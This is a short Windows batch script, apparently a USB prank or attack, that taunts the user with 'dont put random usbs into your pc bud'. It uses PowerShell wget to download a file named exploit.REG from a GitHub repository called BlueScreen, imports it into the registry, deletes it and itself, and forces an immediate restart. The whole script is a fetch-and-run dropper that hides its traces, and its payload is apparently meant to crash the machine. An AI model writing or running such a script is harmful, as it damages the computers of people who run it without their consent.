@echo off
echo dont put random usbs into your pc bud
powershell /c wget https://raw.githubusercontent.com/harryaldwithjarryald/BlueScreen/main/exploit.REG -OutFile temp.REG
temp.REG
del temp.REG
del fix.REG
shutdown -r -t 1
del online_temp.bat
